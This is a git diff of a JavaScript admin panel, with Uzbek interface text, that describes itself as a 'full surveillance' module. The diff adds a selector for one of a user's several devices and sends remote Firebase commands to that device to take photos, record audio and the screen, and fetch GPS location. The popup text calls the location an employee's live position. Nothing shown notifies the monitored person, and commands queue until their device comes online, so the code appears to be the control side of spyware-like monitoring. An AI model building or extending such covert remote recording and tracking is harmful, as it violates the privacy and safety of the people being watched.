@@ -1,6 +1,8 @@
 // IJRO Big Admin Module (Full Surveillance, Device Control, Photo/Audio/Screen/GPS)
 
 let adminSelectedUsername = null;
+let adminUserDevices = [];
+let adminSelectedDeviceId = 'all';
 let adminDeviceListeners = {};
 let adminDeviceData = {
   heartbeat: 0,
@@ -43,6 +45,22 @@ function attachAdminDeviceListeners(devId) {
   const db = window.firebaseRtdb;
   const devRef = db.ref(`tracking/devices/${devId}`);
 
+  // Devices (Ko'p qurilmadan kirilganda qurilmalar ro'yxati)
+  const devicesCb = snap => {
+    const list = [];
+    snap.forEach(child => {
+      const v = child.val();
+      if (v) {
+        v.id = v.id || child.key;
+        list.push(v);
+      }
+    });
+    adminUserDevices = list;
+    renderAdminSubDevices();
+  };
+  devRef.child('devices').on('value', devicesCb);
+  adminDeviceListeners['devices'] = { ref: devRef.child('devices'), cb: devicesCb };
+
   // Heartbeat
   const hbCb = snap => {
     adminDeviceData.heartbeat = snap.val() || 0;
@@ -72,7 +90,7 @@ function attachAdminDeviceListeners(devId) {
   devRef.child('location').on('value', locCb);
   adminDeviceListeners['location'] = { ref: devRef.child('location'), cb: locCb };
 
-  // Archive Photos
+  // Archive Photos (Defolt oxirgi/eng yangi surat ko'rinadi)
   const photosCb = snap => {
     const list = [];
     snap.forEach(child => {
@@ -83,15 +101,13 @@ function attachAdminDeviceListeners(devId) {
       }
     });
     adminDeviceData.photos = list;
-    if (adminDeviceData.currentPhotoIdx >= list.length) {
-      adminDeviceData.currentPhotoIdx = Math.max(0, list.length - 1);
-    }
+    adminDeviceData.currentPhotoIdx = Math.max(0, list.length - 1);
     renderAdminPhotos();
   };
   devRef.child('media/archive_photos').limitToLast(20).on('value', photosCb);
   adminDeviceListeners['photos'] = { ref: devRef.child('media/archive_photos'), cb: photosCb };
 
-  // Archive Audio
+  // Archive Audio (Defolt oxirgi/eng yangi ovoz ko'rinadi)
   const audioCb = snap => {
     const list = [];
     snap.forEach(child => {
@@ -102,15 +118,13 @@ function attachAdminDeviceListeners(devId) {
       }
     });
     adminDeviceData.audios = list;
-    if (adminDeviceData.currentAudioIdx >= list.length) {
-      adminDeviceData.currentAudioIdx = Math.max(0, list.length - 1);
-    }
+    adminDeviceData.currentAudioIdx = Math.max(0, list.length - 1);
     renderAdminAudio();
   };
   devRef.child('media/archive_audio').limitToLast(20).on('value', audioCb);
   adminDeviceListeners['audio'] = { ref: devRef.child('media/archive_audio'), cb: audioCb };
 
-  // Archive Screen
+  // Archive Screen (Defolt oxirgi/eng yangi ekran tasviri ko'rinadi)
   const screenCb = snap => {
     const list = [];
     snap.forEach(child => {
@@ -121,9 +135,7 @@ function attachAdminDeviceListeners(devId) {
       }
     });
     adminDeviceData.screens = list;
-    if (adminDeviceData.currentScreenIdx >= list.length) {
-      adminDeviceData.currentScreenIdx = Math.max(0, list.length - 1);
-    }
+    adminDeviceData.currentScreenIdx = Math.max(0, list.length - 1);
     renderAdminScreenCapture();
   };
   devRef.child('media/archive_screen').limitToLast(20).on('value', screenCb);
@@ -201,6 +213,16 @@ function renderAdminView() {
           </option>
         `).join('')}
       </select>
+
+      <!-- 1b. Qurilma Tanlash (bir nechta qurilmadan kirilganda) -->
+      <div id="admin-subdevice-container" style="margin-top: 10px; display: none; background: #F0FDF4; border: 1.5px solid #86EFAC; border-radius: 8px; padding: 8px 10px;">
+        <div style="font-size: 11px; font-weight: 700; color: #15803D; margin-bottom: 5px; display: flex; align-items: center; gap: 4px;">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+          Buyruq yuboriladigan qurilmani tanlang:
+        </div>
+        <select id="admin-subdevice-select" class="form-control" style="width: 100%; font-size: 12px; font-weight: 600; padding: 6px 8px; border-radius: 6px; border: 1px solid #86EFAC; background: white; color: #166534;" onchange="selectAdminSubDevice(this.value)">
+        </select>
+      </div>
 
       <div id="admin-device-status-badge" style="display: flex; align-items: center; justify-content: space-between; margin-top: 10px; font-size: 12px;">
         <!-- Filled by updateAdminStatusHeader() -->
@@ -286,6 +308,7 @@ function renderAdminView() {
   `;
 
   updateAdminStatusHeader();
+  renderAdminSubDevices();
   renderAdminPhotos();
   renderAdminAudio();
   renderAdminScreenCapture();
@@ -294,122 +317,41 @@ function renderAdminView() {
   }
 }
 
-function updateAdminStatusHeader() {
-  const badgeEl = document.getElementById('admin-device-status-badge');
-  if (!badgeEl) return;
-
-  const now = Date.now();
-  const isOnline = (now - adminDeviceData.heartbeat) < 65000;
-  const batteryStr = adminDeviceData.battery !== null ? `${adminDeviceData.battery}%` : '--';
-
-  badgeEl.innerHTML = `
-    <div style="display: flex; align-items: center; gap: 6px;">
-      <span style="display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: ${isOnline ? '#16A34A' : '#F59E0B'};"></span>
-      <span style="font-weight: bold; color: ${isOnline ? '#16A34A' : '#D97706'};">${isOnline ? 'Online (Faol)' : 'Offline (Kutish rejimida)'}</span>
-      ${!isOnline ? '<span style="font-size: 10px; color: var(--text-secondary); margin-left: 4px;">(Buyruqlar navbatga yoziladi)</span>' : ''}
-    </div>
-    <div style="color: var(--text-secondary); font-weight: 600; display: flex; align-items: center; gap: 4px;">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4z"/></svg>
-      ${batteryStr}
-    </div>
-  `;
+function selectAdminSubDevice(devId) {
+  adminSelectedDeviceId = devId || 'all';
+  const target = adminUserDevices.find(d => d.id === devId);
+  const name = target ? (target.name || target.model || devId) : 'Barcha qurilmalar';
+  showToast(`Tanlangan qurilma: ${name}`);
 }
 
-let adminLeafletMap = null;
-let adminLeafletMarker = null;
+function renderAdminSubDevices() {
+  const container = document.getElementById('admin-subdevice-container');
+  const select = document.getElementById('admin-subdevice-select');
+  if (!container || !select) return;
 
-function resetAdminMap() {
-  if (adminLeafletMap) {
-    try {
-      adminLeafletMap.remove();
-    } catch (_) {}
-    adminLeafletMap = null;
-    adminLeafletMarker = null;
-  }
-}
-
-function updateAdminMapLocation(lat, lon) {
-  const coordsEl = document.getElementById('admin-coords-text');
-  if (coordsEl) coordsEl.innerText = `${lat.toString().substring(0, 8)}, ${lon.toString().substring(0, 8)}`;
-
-  const latNum = parseFloat(lat);
-  const lonNum = parseFloat(lon);
-  if (isNaN(latNum) || isNaN(lonNum)) return;
-
-  const mapContainer = document.getElementById('admin-map-container');
-  if (!mapContainer) return;
-
-  // Leaflet kutubxonasi yuklanganligini tekshirish
-  if (typeof L === 'undefined') {
-    mapContainer.innerHTML = `<div style="padding: 20px; text-align: center; color: #94A3B8; font-size: 12px;">Xarita yuklanmoqda (${latNum}, ${lonNum})...</div>`;
+  if (!adminUserDevices || adminUserDevices.length <= 1) {
+    if (adminUserDevices.length === 1) {
+      adminSelectedDeviceId = adminUserDevices[0].id;
+    } else {
+      adminSelectedDeviceId = 'all';
+    }
+    container.style.display = 'none';
     return;
   }
 
-  const webCustomPin = L.divIcon({
-    className: 'web-pulse-marker',
-    html: '<div style="position:relative;display:flex;align-items:center;justify-content:center;width:32px;height:32px;"><div style="position:absolute;width:36px;height:36px;border-radius:50%;background:rgba(220,38,38,0.35);"></div><svg viewBox="0 0 24 24" width="30" height="30" fill="none"><path d="M12 2C8.13 2 5 5.13 5 9C5 14.25 12 22 12 22C12 22 19 14.25 19 9C19 5.13 15.87 2 12 2Z" fill="#DC2626"/><circle cx="12" cy="9" r="3.5" fill="#FFFFFF"/></svg></div>',
-    iconSize: [32, 32],
-    iconAnchor: [16, 32],
-    popupAnchor: [0, -32]
-  });
-
-  if (!adminLeafletMap) {
-    try {
-      adminLeafletMap = L.map('admin-map-container', {
-        zoomControl: true,
-        attributionControl: false
-      }).setView([latNum, lonNum], 16);
-
-      const googleLayer = L.tileLayer('https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}', {
-        maxZoom: 20,
-        attribution: 'Google'
-      });
-      const googleHybrid = L.tileLayer('https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}', {
-        maxZoom: 20,
-        attribution: 'Google Satellite'
-      });
-      const osmLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        maxZoom: 19,
-        attribution: 'OSM'
-      });
-      const cartoLayer = L.tileLayer('https://basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}@2x.png', {
-        maxZoom: 19,
-        attribution: 'CARTO'
-      });
-
-      googleLayer.addTo(adminLeafletMap);
-
-      L.control.layers({
-        "Google Standart": googleLayer,
-        "Sun'iy yo'ldosh (Google)": googleHybrid,
-        "OpenStreetMap": osmLayer,
-        "CARTO": cartoLayer
-      }).addTo(adminLeafletMap);
-
-      adminLeafletMarker = L.marker([latNum, lonNum], { icon: webCustomPin }).addTo(adminLeafletMap);
-      adminLeafletMarker.bindPopup("<b>Xodim jonli joylashuvi</b>").openPopup();
-    } catch (e) {
-      console.warn("Leaflet init error:", e);
-    }
-  } else {
-    try {
-      adminLeafletMap.setView([latNum, lonNum], 16);
-      if (adminLeafletMarker) {
-        adminLeafletMarker.setLatLng([latNum, lonNum]);
-      } else {
-        adminLeafletMarker = L.marker([latNum, lonNum], { icon: webCustomPin }).addTo(adminLeafletMap);
-        adminLeafletMarker.bindPopup("<b>Xodim jonli joylashuvi</b>").openPopup();
-      }
-    } catch (e) {
-      console.warn("Leaflet update error:", e);
-    }
-  }
-
-  setTimeout(() => {
-    if (adminLeafletMap) {
-      adminLeafletMap.invalidateSize();
-    }
-  }, 200);
+  container.style.display = 'block';
+  select.innerHTML = `
+    <option value="all" ${adminSelectedDeviceId === 'all' ? 'selected' : ''}>🌐 Barcha qurilmalar (${adminUserDevices.length} ta faol)</option>
+    ${adminUserDevices.map(d => {
+      const isOnline = (Date.now() - (d.lastSeen || 0)) < 70000;
+      const statusIcon = isOnline ? '🟢' : '⚪';
+      const batteryStr = d.battery ? ` (Batareya: ${d.battery}%)` : '';
+      const devTitle = d.name || d.model || d.id;
+      return `<option value="${escapeHtml(d.id)}" ${adminSelectedDeviceId === d.id ? 'selected' : ''}>
+        ${statusIcon} ${escapeHtml(devTitle)}${batteryStr}
+      </option>`;
+    }).join('')}
+  `;
 }
 
 // Commands
@@ -423,16 +365,24 @@ function adminSendTakePhoto() {
   }
   lastAdminTakePhotoTime = now;
 
+  const targetDev = adminUserDevices.find(d => d.id === adminSelectedDeviceId);
+  const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
+
   const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
+  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/target_device_id`).set(adminSelectedDeviceId || 'all');
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/take_photo`).set(now);
-  showToast(isOnline ? "Rasm olish buyrug'i yuborildi!" : "Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)");
+  showToast(isOnline ? `Rasm olish buyrug'i yuborildi${devName}!` : `Rasm olish buyrug'i navbatga qo'yildi${devName}`);
 }
 
 function adminToggleRecordAudio() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
+  const targetDev = adminUserDevices.find(d => d.id === adminSelectedDeviceId);
+  const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
+
   const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
   const nextState = !adminDeviceData.isAudioRecordingActive;
   adminDeviceData.isAudioRecordingActive = nextState;
+  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/target_device_id`).set(adminSelectedDeviceId || 'all');
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_audio`).set(nextState);
 
   const btn = document.getElementById('admin-voice-btn');
@@ -442,14 +392,18 @@ function adminToggleRecordAudio() {
       : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z'/></svg>Ovoz Yozish";
     btn.className = nextState ? "btn btn-red" : "btn btn-yellow";
   }
-  showToast(nextState ? (isOnline ? "Masofaviy ovoz yozish boshlandi" : "Ovoz yozish navbatga qo'yildi") : "Ovoz yozish to'xtatildi, saqlanmoqda...");
+  showToast(nextState ? (isOnline ? `Masofaviy ovoz yozish boshlandi${devName}` : `Ovoz yozish navbatga qo'yildi${devName}`) : "Ovoz yozish to'xtatildi, saqlanmoqda...");
 }
 
 function adminToggleRecordScreen() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
+  const targetDev = adminUserDevices.find(d => d.id === adminSelectedDeviceId);
+  const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
+
   const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
   const nextState = !adminDeviceData.isScreenRecordingActive;
   adminDeviceData.isScreenRecordingActive = nextState;
+  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/target_device_id`).set(adminSelectedDeviceId || 'all');
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_screen`).set(nextState);
 
   const btn = document.getElementById('admin-screen-btn');
@@ -459,14 +413,18 @@ function adminToggleRecordScreen() {
       : "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><path d='M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z'/></svg>Ekran Zapis";
     btn.style.background = nextState ? "#DC2626" : "#7C3AED";
   }
-  showToast(nextState ? (isOnline ? "Masofaviy ekran yozish boshlandi..." : "Ekran yozish navbatga qo'yildi") : "Ekran yozish to'xtatildi, saqlanmoqda...");
+  showToast(nextState ? (isOnline ? `Masofaviy ekran yozish boshlandi${devName}...` : `Ekran yozish navbatga qo'yildi${devName}`) : "Ekran yozish to'xtatildi, saqlanmoqda...");
 }
 
 function adminSendRequestGps() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
+  const targetDev = adminUserDevices.find(d => d.id === adminSelectedDeviceId);
+  const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
+
   const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
+  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/target_device_id`).set(adminSelectedDeviceId || 'all');
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/request_gps`).set(Date.now());
-  showToast(isOnline ? "GPS yangilash so'rovi yuborildi!" : "GPS so'rovi navbatga qo'yildi");
+  showToast(isOnline ? `GPS yangilash so'rovi yuborildi${devName}!` : `GPS so'rovi navbatga qo'yildi${devName}`);
 }
 
 // Photos Viewer
